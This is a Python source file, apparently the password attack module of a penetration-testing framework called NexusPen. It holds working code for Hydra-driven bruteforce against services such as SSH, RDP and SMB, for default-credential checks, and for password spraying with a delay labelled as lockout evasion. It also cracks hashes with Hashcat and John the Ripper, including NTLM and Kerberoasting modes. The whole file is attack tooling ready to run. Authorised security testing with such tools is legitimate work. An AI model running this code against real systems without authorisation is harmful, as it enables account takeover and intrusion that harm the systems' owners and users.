#!/usr/bin/env python3
"""
NexusPen - Password Attack Module
==================================
Bruteforce, password spraying, and hash cracking.
"""

import subprocess
import os
import re
import time
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.table import Table

console = Console()


@dataclass
class CredentialFinding:
    """Represents a found credential."""
    host: str
    service: str
    port: int
    username: str
    password: str
    source: str  # bruteforce, spray, crack


class PasswordBruteforce:
    """
    Password bruteforce module.
    Integrates with Hydra, Medusa, and provides native Python implementation.
    """
    
    # Default credentials to try
    DEFAULT_CREDS = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', '123456'),
        ('root', 'root'),
        ('root', 'toor'),
        ('administrator', 'administrator'),
        ('user', 'user'),
        ('test', 'test'),
        ('guest', 'guest'),
    ]
    
    # Service to port mapping
    SERVICE_PORTS = {
        'ssh': 22,
        'ftp': 21,
        'telnet': 23,
        'mysql': 3306,
        'mssql': 1433,
        'postgresql': 5432,
        'rdp': 3389,
        'smb': 445,
        'vnc': 5900,
        'http': 80,
        'https': 443,
        'smtp': 25,
        'pop3': 110,
        'imap': 143,
    }
    
    def __init__(self, target: str, config: Dict = None):
        self.target = target
        self.config = config or {}
        self.findings: List[CredentialFinding] = []
    
    def hydra_attack(self, service: str, port: int = None, 
                     userlist: str = None, passlist: str = None,
                     username: str = None, password: str = None,
                     threads: int = 16) -> List[CredentialFinding]:
        """
        Run Hydra for bruteforce attack.
        
        Args:
            service: Target service (ssh, ftp, rdp, etc.)
            port: Target port
            userlist: Path to username wordlist
            passlist: Path to password wordlist
            username: Single username to try
            password: Single password to try
            threads: Number of threads
        """
        console.print(f"\n[cyan]🔐 Running Hydra against {service}://{self.target}[/cyan]")
        
        port = port or self.SERVICE_PORTS.get(service, 22)
        
        cmd = [
            'hydra',
            '-t', str(threads),
            '-V',
        ]
        
        # Add credentials
        if username:
            cmd.extend(['-l', username])
        elif userlist:
            cmd.extend(['-L', userlist])
        else:
            cmd.extend(['-L', '/usr/share/wordlists/metasploit/unix_users.txt'])
        
        if password:
            cmd.extend(['-p', password])
        elif passlist:
            cmd.extend(['-P', passlist])
        else:
            cmd.extend(['-P', '/usr/share/wordlists/rockyou.txt'])
        
        # Add target
        cmd.extend(['-s', str(port)])
        cmd.append(self.target)
        cmd.append(service)
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
            
            # Parse successful logins
            for line in result.stdout.split('\n'):
                if 'login:' in line.lower() and 'password:' in line.lower():
                    # Parse: [22][ssh] host: 192.168.1.1   login: admin   password: admin
                    match = re.search(r'login:\s*(\S+)\s+password:\s*(\S+)', line)
                    if match:
                        self.findings.append(CredentialFinding(
                            host=self.target,
                            service=service,
                            port=port,
                            username=match.group(1),
                            password=match.group(2),
                            source='hydra'
                        ))
            
            console.print(f"[green]✓ Found {len(self.findings)} credentials[/green]")
            
        except subprocess.TimeoutExpired:
            console.print("[yellow]⚠️ Hydra timed out[/yellow]")
        except FileNotFoundError:
            console.print("[red]❌ Hydra not found[/red]")
        
        return self.findings
    
    def default_creds_check(self, service: str, port: int = None) -> List[CredentialFinding]:
        """Check for default credentials."""
        console.print(f"\n[cyan]🔑 Checking default credentials on {service}[/cyan]")
        
        port = port or self.SERVICE_PORTS.get(service, 22)
        
        for username, password in self.DEFAULT_CREDS:
            if self._test_credential(service, port, username, password):
                self.findings.append(CredentialFinding(
                    host=self.target,
                    service=service,
                    port=port,
                    username=username,
                    password=password,
                    source='default'
                ))
                console.print(f"[green]✓ Found: {username}:{password}[/green]")
        
        return self.findings
    
    def _test_credential(self, service: str, port: int, 
                        username: str, password: str) -> bool:
        """Test a single credential."""
        try:
            if service == 'ssh':
                import paramiko
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(self.target, port=port, username=username, 
                             password=password, timeout=5)
                client.close()
                return True
            elif service == 'ftp':
                from ftplib import FTP
                ftp = FTP()
                ftp.connect(self.target, port, timeout=5)
                ftp.login(username, password)
                ftp.quit()
                return True
            # Add more services as needed
        except:
            pass
        return False


class PasswordSpray:
    """Password spraying attack module."""
    
    def __init__(self, target: str, config: Dict = None):
        self.target = target
        self.config = config or {}
        self.findings: List[CredentialFinding] = []
    
    def spray(self, users: List[str], passwords: List[str], 
              service: str, port: int = None, delay: int = 0) -> List[CredentialFinding]:
        """
        Perform password spraying attack.
        
        Args:
            users: List of usernames
            passwords: List of passwords (usually just one or few)
            service: Target service
            port: Target port
            delay: Delay between attempts (for lockout evasion)
        """
        console.print(f"\n[cyan]🌊 Password Spraying against {service}://{self.target}[/cyan]")
        console.print(f"[yellow]Users: {len(users)}, Passwords: {len(passwords)}[/yellow]")
        
        # Spray: try each password against all users before moving to next password
        for password in passwords:
            console.print(f"[cyan]Trying password: {password}[/cyan]")
            
            for username in users:
                try:
                    if self._test_credential(service, port or 22, username, password):
                        self.findings.append(CredentialFinding(
                            host=self.target,
                            service=service,
                            port=port or 22,
                            username=username,
                            password=password,
                            source='spray'
                        ))
                        console.print(f"[green]✓ Found: {username}:{password}[/green]")
                except:
                    pass
                
                if delay:
                    time.sleep(delay)
        
        return self.findings
    
    def _test_credential(self, service: str, port: int,
                        username: str, password: str) -> bool:
        """Test credential."""
        # Reuse from PasswordBruteforce
        try:
            if service == 'ssh':
                import paramiko
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(self.target, port=port, username=username,
                             password=password, timeout=5)
                client.close()
                return True
        except:
            pass
        return False


class HashCracker:
    """Hash cracking module using Hashcat and John the Ripper."""
    
    # Common hash types for Hashcat
    HASH_MODES = {
        'md5': 0,
        'sha1': 100,
        'sha256': 1400,
        'sha512': 1700,
        'ntlm': 1000,
        'netlm': 3000,
        'netntlm': 5500,
        'netntlmv2': 5600,
        'kerberos_tgs': 13100,  # Kerberoasting
        'kerberos_asrep': 18200,  # AS-REP Roasting
        'mysql': 300,
        'mssql': 1731,
        'postgres': 12,
        'bcrypt': 3200,
    }
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.cracked: List[Tuple[str, str]] = []
    
    def crack_with_hashcat(self, hash_file: str, hash_type: str,
                          wordlist: str = None, rules: str = None,
                          attack_mode: int = 0) -> List[Tuple[str, str]]:
        """
        Crack hashes using Hashcat.
        
        Args:
            hash_file: File containing hashes
            hash_type: Type of hash (md5, ntlm, etc.)
            wordlist: Wordlist file
            rules: Rules file
            attack_mode: Attack mode (0=dictionary, 3=bruteforce)
        """
        console.print(f"\n[cyan]💥 Cracking hashes with Hashcat[/cyan]")
        
        mode = self.HASH_MODES.get(hash_type.lower(), 0)
        wordlist = wordlist or '/usr/share/wordlists/rockyou.txt'
        
        output_file = '/tmp/hashcat_cracked.txt'
        
        cmd = [
            'hashcat',
            '-m', str(mode),
            '-a', str(attack_mode),
            hash_file,
            wordlist,
            '-o', output_file,
            '--force',
            '--potfile-disable',
        ]
        
        if rules:
            cmd.extend(['-r', rules])
        
        try:
            subprocess.run(cmd, capture_output=True, timeout=3600)
            
            # Read cracked hashes
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    for line in f:
                        if ':' in line:
                            parts = line.strip().split(':')
                            hash_val = parts[0]
                            password = ':'.join(parts[1:])
                            self.cracked.append((hash_val, password))
                
                console.print(f"[green]✓ Cracked {len(self.cracked)} hashes[/green]")
                
        except subprocess.TimeoutExpired:
            console.print("[yellow]⚠️ Hashcat timed out[/yellow]")
        except FileNotFoundError:
            console.print("[red]❌ Hashcat not found[/red]")
        
        return self.cracked
    
    def crack_with_john(self, hash_file: str, format: str = None,
                       wordlist: str = None) -> List[Tuple[str, str]]:
        """
        Crack hashes using John the Ripper.
        
        Args:
            hash_file: File containing hashes
            format: Hash format (auto-detect if None)
            wordlist: Wordlist file
        """
        console.print(f"\n[cyan]💥 Cracking hashes with John the Ripper[/cyan]")
        
        cmd = ['john']
        
        if format:
            cmd.extend(['--format=' + format])
        if wordlist:
            cmd.extend(['--wordlist=' + wordlist])
        else:
            cmd.extend(['--wordlist=/usr/share/wordlists/rockyou.txt'])
        
        cmd.append(hash_file)
        
        try:
            subprocess.run(cmd, capture_output=True, timeout=3600)
            
            # Show cracked
            result = subprocess.run(['john', '--show', hash_file], 
                                   capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if ':' in line and not line.startswith('0 password'):
                    parts = line.strip().split(':')
                    if len(parts) >= 2:
                        self.cracked.append((parts[0], parts[1]))
            
            console.print(f"[green]✓ Cracked {len(self.cracked)} hashes[/green]")
            
        except subprocess.TimeoutExpired:
            console.print("[yellow]⚠️ John timed out[/yellow]")
        except FileNotFoundError:
            console.print("[red]❌ John not found[/red]")
        
        return self.cracked
    
    def identify_hash(self, hash_value: str) -> List[str]:
        """Identify hash type."""
        possible_types = []
        hash_len = len(hash_value)
        
        if hash_len == 32:
            possible_types.extend(['md5', 'ntlm'])
        elif hash_len == 40:
            possible_types.append('sha1')
        elif hash_len == 64:
            possible_types.append('sha256')
        elif hash_len == 128:
            possible_types.append('sha512')
        elif ':' in hash_value and len(hash_value) > 100:
            possible_types.append('kerberos')
        
        return possible_types


# Module entry point
def run_bruteforce(target: str, service: str, port: int = None,
                   userlist: str = None, passlist: str = None):
    """Run password bruteforce attack."""
    bf = PasswordBruteforce(target)
    return bf.hydra_attack(service, port, userlist, passlist)


def run_spray(target: str, users: List[str], passwords: List[str],
              service: str, port: int = None):
    """Run password spray attack."""
    spray = PasswordSpray(target)
    return spray.spray(users, passwords, service, port)
